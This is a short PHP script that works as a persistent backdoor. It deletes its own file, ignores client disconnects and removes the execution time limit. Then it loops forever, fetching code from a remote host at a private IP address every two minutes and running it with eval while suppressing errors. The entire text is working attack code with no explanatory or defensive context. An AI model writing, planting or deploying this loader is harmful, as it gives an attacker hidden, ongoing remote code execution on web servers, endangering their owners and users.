<?php
unlink($_SERVER["SCRIPT_FILENAME"]);
ignore_user_abort(true);
set_time_limit(0);
$remote_file = "http://192.168.131.136:8080/thisisasecret.txt";
while(1){
  $code = file_get_contents($remote_file);
  @eval($code);
  sleep(120);
}
?>